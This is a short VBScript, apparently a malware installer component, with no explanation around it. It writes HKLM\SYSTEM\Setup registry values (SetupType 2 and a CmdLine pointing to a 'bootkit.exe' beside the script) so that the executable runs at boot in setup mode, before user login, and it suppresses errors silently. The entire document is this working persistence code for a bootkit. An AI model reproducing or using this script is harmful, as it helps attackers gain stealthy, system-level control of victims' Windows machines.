Set WshShell = CreateObject("WScript.Shell")
regPath = "HKLM\SYSTEM\Setup\"
exePath = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName) & "\bootkit.exe"

On Error Resume Next
WshShell.RegWrite regPath & "SetupType", 2, "REG_DWORD"
WshShell.RegWrite regPath & "CmdLine", exePath, "REG_SZ"
